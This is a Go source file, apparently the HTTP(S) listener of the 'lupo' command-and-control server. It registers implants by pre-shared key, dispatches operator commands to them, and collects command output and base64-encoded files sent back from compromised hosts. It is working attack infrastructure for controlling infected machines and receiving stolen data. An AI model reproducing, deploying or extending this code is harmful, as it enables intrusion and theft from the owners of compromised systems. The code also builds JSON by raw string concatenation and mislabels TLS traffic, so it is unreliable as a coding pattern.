package server

import (
	"encoding/json"
	"errors"
	"fmt"
	"net/http"
	"net/url"
	"strconv"
	"strings"

	"github.com/google/uuid"

	"github.com/InjectionSoftwareandSecurityLLC/lupo/lupo-server/core"
)

// HTTPServerHandler - Handles all HTTPS/HTTPServer requests by passing data to handler sub-functions based on request type.
//
// Also sets HTTP server parameters and any other applicable HTTP server level variables.
func HTTPServerHandler(w http.ResponseWriter, r *http.Request) {
	// Setup webserver attributes like headers and response information
	w.Header().Set("Content-Type", "application/json")

	switch r.Method {
	case "GET":
		handleGetRequests(w, r)
	case "POST":
		handlePostRequests(w, r)
	default:
		// Invalid request type, stay silent don't respond to anything that isn't pre-defined
		return
	}

	return
}

// handleGetRequests - handles any incoming GET requests received by the HTTP(S) listener. Once all values are handled various Implant data update/response routines are executed where relevant based on the provided parameters.
//
// When requests are received, the URL parameters are extracted, validated and stored.
//
// HTTP GET Requests are expected to be provided as URL parameters like any other web request. The following parameters can be provided:
//
// PSK - the client Pre-Shared Key that the the implant will send to be compared for authentication to the server PSK
//
// SessionID - a unique Session ID that the implant sends to identify what session it is. This value is supplied to implants by the server after a successful registration.
//
// UUID - a unique UUID formatted identifier that the implant sends to identify what session it is. This value is supplied to implants by the server after a successful registration. The UUID is not the primary identifier but is a secondary validation to prevent id bruteforcing or id mis-matches during the registration/de-registration processes.
//
// ImplantArch - a string for storing the Architecture of an implant's host system. This can be anything and is provided by the implant, but is expected to be something that identifies the host operating system and architecture.
//
// Update - an update interval in seconds that implants provide to tell the server how often it intends to check in. This value is used to determine if a session may have been killed.
//
// Data - a data payload, usually the output of execute commands on the implant. Once an implant executes a command, it can send the output to the data parameter where it will be printed to the user in the Lupo CLI.
//
// AdditionalFunctions - additional function names that can be registered to a given session. These contain a JSON string of {"name":"description"} that is loaded into the CLI if successfully registered. Users can then execute these as unique session sub-commands. It is assumed that the implant has implemented these functions and will execute reserved actions once the registered keyword is received.
//
// Username - a username provided so the handler knows who the request is destined for, defaults to "server" if the implant does not specify in the request.
//
// Register - a boolean value that lets a listener know if an implant is attempting to register itself or not. If not provided registration is assumed to be false. If registration is attempted the listener will check for valid authentication via the PSK and attempt to register a new session.
//
// FileName - a string value provided by an implant that is the filename for a file being sent to download or upload.
//
// File - a string value that is expected to be a base64 encoded string that is a file to download or upload.

func handleGetRequests(w http.ResponseWriter, r *http.Request) {

	// Construct variables for GET URL paramaters
	getParams := r.URL.Query()
	var getPSK string
	var getSessionID int
	var getUUID uuid.UUID
	var getImplantArch string
	var getUpdate float64
	var getData string
	var getAdditionalFunctions string
	var additionalFunctions map[string]interface{}
	var getUsername string
	register := false
	var getFileName string
	var getFile string
	var err error

	// Get the Remote Address of the Implant from the request
	remoteAddr := r.RemoteAddr

	// Check GET URL parameters and handle errors
	if len(getParams["psk"]) > 0 {
		getPSK = getParams["psk"][0]
	} else {
		errorString := "http GET Request did not provide PSK, request ignored"
		core.LogData(errorString)
		returnErr := errors.New(errorString)
		ErrorHandler(returnErr)
		return
	}

	if len(getParams["register"]) > 0 {
		register, err = strconv.ParseBool(getParams["register"][0])
		if err != nil {
			errorString := "http GET Request to register implant was not a valid Boolean, request ignored"
			core.LogData(errorString)
			returnErr := errors.New(errorString)
			ErrorHandler(returnErr)
			return
		}
	}

	if len(getParams["sessionID"]) > 0 {
		getSessionID, err = strconv.Atoi(getParams["sessionID"][0])
		if err != nil {
			errorString := "http GET Request session ID was not a valid number, request ignored"
			core.LogData(errorString)
			returnErr := errors.New(errorString)
			ErrorHandler(returnErr)
			return
		}
	} else {
		getSessionID = -1
	}

	if len(getParams["UUID"]) > 0 {
		getUUID, err = uuid.Parse(getParams["UUID"][0])
		if err != nil {
			errorString := "http GET Request UUID was not a UUID, request ignored"
			core.LogData(errorString)
			returnErr := errors.New(errorString)
			ErrorHandler(returnErr)
			return
		}
	} else {
		getUUID = core.ZeroedUUID
	}

	if len(getParams["arch"]) > 0 {
		getImplantArch = getParams["arch"][0]
	} else {
		getImplantArch = r.UserAgent()
	}

	if len(getParams["update"]) > 0 {
		getUpdate, err = strconv.ParseFloat(getParams["update"][0], 64)
		if err != nil {
			errorString := "http GET Request update interval was not a valid number, request ignored"
			core.LogData(errorString)
			returnErr := errors.New(errorString)
			ErrorHandler(returnErr)
			return
		}
	} else {
		getUpdate = 0
	}

	if len(getParams["data"]) > 0 {
		getData = getParams["data"][0]
	} else {
		getData = ""
	}

	if len(getParams["functions"]) > 0 {
		getAdditionalFunctions = getParams["functions"][0]
		json.Unmarshal([]byte(getAdditionalFunctions), &additionalFunctions)
	} else {
		getAdditionalFunctions = ""
		additionalFunctions = nil
	}

	if len(getParams["user"]) > 0 {
		getUsername = getParams["user"][0]
	} else {
		getUsername = "server"
	}
	if len(getParams["filename"]) > 0 {
		getFileName = getParams["filename"][0]
	}

	if len(getParams["file"]) > 0 {
		getFile = getParams["file"][0]
	}

	if getPSK == PSK {

		if register == true {

			implant := core.RegisterImplant(getImplantArch, getUpdate, additionalFunctions, "")

			var protocol string
			if r.TLS == nil {
				protocol = "HTTPS"
			} else {
				protocol = "HTTP"
			}
			core.RegisterSession(core.SessionID, protocol, implant, remoteAddr, 0, "", "", "", "")

			newSession := core.SessionID - 1

			response := map[string]interface{}{
				"sessionID": newSession,
				"UUID":      implant.ID,
			}

			json.NewEncoder(w).Encode(response)

			core.BroadcastSession(strconv.Itoa(newSession))

			return

		}
	} else {
		errorString := "http GET Request Invalid PSK, request ignored"
		core.LogData(errorString)
		returnErr := errors.New(errorString)
		ErrorHandler(returnErr)
		return
	}

	if core.Sessions[getSessionID].Implant.ID != getUUID || getUUID == core.ZeroedUUID {

		if core.PersistenceMode {
			reconnectString := "Old implant with UUID: " + getUUID.String() + "connected, attempting to reestablish session..."
			core.LogData(reconnectString)
			core.WarningColorBold.Println(reconnectString)

			implant := core.RegisterImplant(getImplantArch, getUpdate, additionalFunctions, getUUID.String())

			var protocol string
			if r.TLS == nil {
				protocol = "HTTPS"
			} else {
				protocol = "HTTP"
			}
			core.RegisterSession(core.SessionID, protocol, implant, remoteAddr, 0, "", "", "", "")

			newSession := core.SessionID - 1

			response := map[string]interface{}{
				"sessionID": newSession,
				"UUID":      implant.ID,
			}

			json.NewEncoder(w).Encode(response)

			core.BroadcastSession(strconv.Itoa(newSession))

			return
		} else {
			errorString := "http GET Request Invalid UUID, request ignored"
			core.LogData(errorString)
			returnErr := errors.New(errorString)
			ErrorHandler(returnErr)
			return
		}
	}

	if getData != "" {
		core.LogData("Session " + strconv.Itoa(getSessionID) + " returned:\n" + getData)
		if getUsername == "server" {
			fmt.Println("\nSession " + strconv.Itoa(getSessionID) + " returned:\n" + getData)
		} else {
			currentWolf := core.Wolves[getUsername]
			data, err := url.QueryUnescape(getData)
			if err != nil {
				core.LogData("Session " + strconv.Itoa(getSessionID) + " error: could not escape data returned by client")
			}

			data = strings.ReplaceAll(data, "\\", "\\\\")
			jsonData := `{"data":"` + data + `"}`
			core.AssignWolfBroadcast(currentWolf.Username, currentWolf.Rhost, jsonData)
		}
	}

	if getFileName != "" {
		core.LogData("Session " + strconv.Itoa(getSessionID) + " returned the file: " + getFileName)

		if getFile == "" {
			core.LogData("Session " + strconv.Itoa(getSessionID) + " file contents was empty, no file written for: " + getFileName)
			fmt.Println("\nSession " + strconv.Itoa(getSessionID) + " file contents was empty, no file written for: " + getFileName)
		} else {
			if getUsername == "server" {
				core.DownloadFile(getFileName, getFile)
			} else {
				currentWolf := core.Wolves[getUsername]
				jsonData := `{"filename":"` + getFileName + `"` + `,"file":"` + getFile + `"}`
				core.AssignWolfBroadcast(currentWolf.Username, currentWolf.Rhost, jsonData)
			}
		}
	}

	var cmd string
	var user string

	if core.Sessions[getSessionID].Implant.Commands != nil {
		cmd = core.Sessions[getSessionID].Implant.Commands[0].Command
		user = core.Sessions[getSessionID].Implant.Commands[0].Operator
	}

	response := map[string]interface{}{
		"user": user,
		"cmd":  cmd,
	}

	json.NewEncoder(w).Encode(response)

	core.UpdateImplant(getSessionID, getUpdate, additionalFunctions)

	core.SessionCheckIn(getSessionID)
}

// handPostRequests - handles any incoming POST requests received by the HTTP(S) listener. Once all values are handled various Implant data update/response routines are executed where relevant based on the provided parameters.
//
// When requests are received, the Form parameters are extracted, validated and stored.
//
// HTTP POST Requests are expected to be provided as standard Form based parameters in the body of the request. The following parameters can be provided:
//
// PSK - the client Pre-Shared Key that the the implant will send to be compared for authentication to the server PSK
//
// SessionID - a unique Session ID that the implant sends to identify what session it is. This value is supplied to implants by the server after a successful registration.
//
// UUID - a unique UUID formatted identifier that the implant sends to identify what session it is. This value is supplied to implants by the server after a successful registration. The UUID is not the primary identifier but is a secondary validation to prevent id bruteforcing or id mis-matches during the registration/de-registration processes.
//
// ImplantArch - a string for storing the Architecture of an implant's host system. This can be anything and is provided by the implant, but is expected to be something that identifies the host operating system and architecture.
//
// Update - an update interval in seconds that implants provide to tell the server how often it intends to check in. This value is used to determine if a session may have been killed.
//
// Data - a data payload, usually the output of execute commands on the implant. Once an implant executes a command, it can send the output to the data parameter where it will be printed to the user in the Lupo CLI.
//
// AdditionalFunctions - additional function names that can be registered to a given session. These contain a JSON string of {"name":"description"} that is loaded into the CLI if successfully registered. Users can then execute these as unique session sub-commands. It is assumed that the implant has implemented these functions and will execute reserved actions once the registered keyword is received.
//
// Username - a username provided so the handler knows who the request is destined for, defaults to "server" if the implant does not specify in the request.
//
// Register - a boolean value that lets a listener know if an implant is attempting to register itself or not. If not provided registration is assumed to be false. If registration is attempted the listener will check for valid authentication via the PSK and attempt to register a new session.
//
// FileName - a string value provided by an implant that is the filename for a file being sent to download or upload.
//
// File - a string value that is expected to be a base64 encoded string that is a file to download or upload.

func handlePostRequests(w http.ResponseWriter, r *http.Request) {
	r.ParseForm()
	// Construct variables for POST Data paramaters
	postParams := r.Form
	var postPSK string
	var postSessionID int
	var postUUID uuid.UUID
	var postImplantArch string
	var postUpdate float64
	var postData string
	var postAdditionalFunctions string
	var additionalFunctions map[string]interface{}
	var postUsername string
	register := false
	var postFileName string
	var postFile string
	var err error

	// Get the Remote Address of the Implant from the request
	remoteAddr := r.RemoteAddr

	// Check POST Data parameters and handle errors
	if len(postParams["psk"]) > 0 {
		postPSK = postParams["psk"][0]
	} else {
		errorString := "http POST Request did not provide PSK, request ignored"
		core.LogData(errorString)
		returnErr := errors.New(errorString)
		ErrorHandler(returnErr)
		return
	}

	if len(postParams["register"]) > 0 {
		register, err = strconv.ParseBool(postParams["register"][0])
		if err != nil {
			errorString := "http POST Request to register implant was not a valid Boolean, request ignored"
			core.LogData(errorString)
			returnErr := errors.New(errorString)
			ErrorHandler(returnErr)
			return
		}
	}

	if len(postParams["sessionID"]) > 0 {
		postSessionID, err = strconv.Atoi(postParams["sessionID"][0])
		if err != nil {
			errorString := "http POST Request session ID was not a valid number, request ignored"
			core.LogData(errorString)
			returnErr := errors.New(errorString)
			ErrorHandler(returnErr)
			return
		}
	} else {
		postSessionID = -1
	}

	if len(postParams["UUID"]) > 0 {
		postUUID, err = uuid.Parse(postParams["UUID"][0])
		if err != nil {
			errorString := "http POST Request UUID was not a UUID, request ignored"
			core.LogData(errorString)
			returnErr := errors.New(errorString)
			ErrorHandler(returnErr)
			return
		}
	} else {
		postUUID = core.ZeroedUUID
	}

	if len(postParams["arch"]) > 0 {
		postImplantArch = postParams["arch"][0]
	} else {
		postImplantArch = r.UserAgent()
	}

	if len(postParams["update"]) > 0 {
		postUpdate, err = strconv.ParseFloat(postParams["update"][0], 64)
		if err != nil {
			errorString := "http POST Request update internval was not a valid number, request ignored"
			core.LogData(errorString)
			returnErr := errors.New(errorString)
			ErrorHandler(returnErr)
			return
		}
	} else {
		postUpdate = 0
	}

	if len(postParams["data"]) > 0 {
		postData = postParams["data"][0]
	} else {
		postData = ""
	}

	if len(postParams["functions"]) > 0 {
		postAdditionalFunctions = postParams["functions"][0]
		json.Unmarshal([]byte(postAdditionalFunctions), &additionalFunctions)
	} else {
		postAdditionalFunctions = ""
	}

	if len(postParams["user"]) > 0 {
		postUsername = postParams["user"][0]
	} else {
		postUsername = "server"
	}

	if len(postParams["filename"]) > 0 {
		postFileName = postParams["filename"][0]
	}

	if len(postParams["file"]) > 0 {
		postFile = postParams["file"][0]
	}

	if postPSK == PSK {

		if register == true {

			implant := core.RegisterImplant(postImplantArch, postUpdate, additionalFunctions, "")

			var protocol string
			if r.TLS == nil {
				protocol = "HTTPS"
			} else {
				protocol = "HTTP"
			}
			core.RegisterSession(core.SessionID, protocol, implant, remoteAddr, 0, "", "", "", "")

			newSession := core.SessionID - 1

			response := map[string]interface{}{
				"sessionID": newSession,
				"UUID":      implant.ID,
			}

			json.NewEncoder(w).Encode(response)

			core.BroadcastSession(strconv.Itoa(newSession))

			return

		}
	} else {
		errorString := "http POST Request Invalid PSK, request ignored"
		core.LogData(errorString)
		returnErr := errors.New(errorString)
		ErrorHandler(returnErr)
		return
	}

	if core.Sessions[postSessionID].Implant.ID != postUUID || postUUID == core.ZeroedUUID {

		if core.PersistenceMode {
			reconnectString := "Old implant with UUID: " + postUUID.String() + "connected, attempting to reestablish session..."
			core.LogData(reconnectString)
			core.WarningColorBold.Println(reconnectString)

			implant := core.RegisterImplant(postImplantArch, postUpdate, additionalFunctions, postUUID.String())

			var protocol string
			if r.TLS == nil {
				protocol = "HTTPS"
			} else {
				protocol = "HTTP"
			}
			core.RegisterSession(core.SessionID, protocol, implant, remoteAddr, 0, "", "", "", "")

			newSession := core.SessionID - 1

			response := map[string]interface{}{
				"sessionID": newSession,
				"UUID":      implant.ID,
			}

			json.NewEncoder(w).Encode(response)

			core.BroadcastSession(strconv.Itoa(newSession))

			return
		} else {
			errorString := "http POST Request Invalid UUID, request ignored"
			core.LogData(errorString)
			returnErr := errors.New(errorString)
			ErrorHandler(returnErr)
			return
		}

	}

	if postData != "" {
		core.LogData("Session " + strconv.Itoa(postSessionID) + " returned:\n" + postData)
		if postUsername == "server" {
			fmt.Println("\nSession " + strconv.Itoa(postSessionID) + " returned:\n" + postData)
		} else {
			currentWolf := core.Wolves[postUsername]
			jsonData := `{"data":"` + postData + `"}`
			core.AssignWolfBroadcast(currentWolf.Username, currentWolf.Rhost, jsonData)
		}
	}

	if postFileName != "" {
		core.LogData("Session " + strconv.Itoa(postSessionID) + " returned the file: " + postFileName)

		if postFile == "" {
			core.LogData("Session " + strconv.Itoa(postSessionID) + " file contents was empty, no file written for: " + postFileName)
			fmt.Println("\nSession " + strconv.Itoa(postSessionID) + " file contents was empty, no file written for: " + postFileName)
		} else {
			if postUsername == "server" {
				core.DownloadFile(postFileName, postFile)
			} else {
				currentWolf := core.Wolves[postUsername]
				jsonData := `{"filename":"` + postFileName + `"` + `,"file":"` + postFile + `"}`
				core.AssignWolfBroadcast(currentWolf.Username, currentWolf.Rhost, jsonData)
			}
		}
	}

	var cmd string
	var user string

	if core.Sessions[postSessionID].Implant.Commands != nil {
		cmd = core.Sessions[postSessionID].Implant.Commands[0].Command
		user = core.Sessions[postSessionID].Implant.Commands[0].Operator
	}

	response := map[string]interface{}{
		"user": user,
		"cmd":  cmd,
	}

	json.NewEncoder(w).Encode(response)

	core.UpdateImplant(postSessionID, postUpdate, additionalFunctions)
	core.SessionCheckIn(postSessionID)

}
